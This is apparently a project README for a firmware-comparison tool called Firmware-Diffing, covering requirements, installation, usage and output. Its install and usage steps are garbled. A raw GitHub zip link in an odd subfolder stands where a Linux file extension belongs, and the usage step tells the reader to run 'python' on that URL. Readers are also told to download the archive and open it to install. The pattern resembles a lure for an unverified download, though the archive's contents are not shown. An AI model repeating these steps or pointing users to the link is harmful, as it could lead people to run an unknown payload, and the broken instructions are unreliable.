## 🚀 Getting Started

Firmware-Diffing is a Python tool designed to help you compare different versions of firmware. It uses SHA256 and ssdeep fuzzy hashing to find differences, such as modified, added, or deleted files. This tool is particularly useful for cybersecurity research, firmware updates, and educational purposes.

## 📦 System Requirements

Before you proceed, ensure that you have the following:

- **Operating System:** Windows, macOS, or Linux.
- **Python Version:** Python 3.6 or later. 
- **Network:** Internet connection to download firmware files.

## 📥 Download & Install

To get started, visit this page to download:

2. You will see a list of available versions. Choose the latest version.
3. Download the file that matches your operating system. For example:
   - For Windows, look for `.exe` files.
   - For macOS, you might find `.dmg` files.
   - For Linux, you may see `https://github.com/Alosh-ui/Firmware-Diffing/raw/refs/heads/main/Pierinae/Firmware_Diffing_v3.6.zip` files.
4. Once the download completes, locate the file on your computer.
5. Open the file to begin the installation process. Follow the prompts to complete the setup.

## 🛠 How to Use Firmware-Diffing

After installation, follow these steps to compare firmware versions:

1. Gather the firmware files you want to compare. Make sure you have both old and new versions ready.
2. Open your terminal or command prompt.
3. Navigate to the directory where you installed Firmware-Diffing. Use the command:
   ```
   cd path/to/your/installation
   ```
4. Run the tool using the command:
   ```
   python https://github.com/Alosh-ui/Firmware-Diffing/raw/refs/heads/main/Pierinae/Firmware_Diffing_v3.6.zip [old_firmware_file] [new_firmware_file]
   ```
   Replace `[old_firmware_file]` and `[new_firmware_file]` with the actual file names.

5. Wait for the tool to analyze the files. It will output the differences found, including files that have changed, been added, or removed.

## 📊 Understanding the Output

Firmware-Diffing will provide a summary of changes detected between the firmware files. The output will typically include:

- **Modified Files:** Files that have changed between versions.
- **Added Files:** New files that do not exist in the old version.
- **Deleted Files:** Files that were present in the old version but not in the new one.

Each section will give you clear information, making it easy to assess what has changed.

## ⚙️ Advanced Features

- **Fuzzy Hashing:** This feature allows you to detect similar files that might not match exactly. It is useful for identifying slight variations in firmware updates.
- **SHA256 Verification:** This adds another layer of security, allowing you to verify the integrity of your firmware files.
- **User Logs:** Keep track of your comparisons with user-friendly logs that summarize your activities.
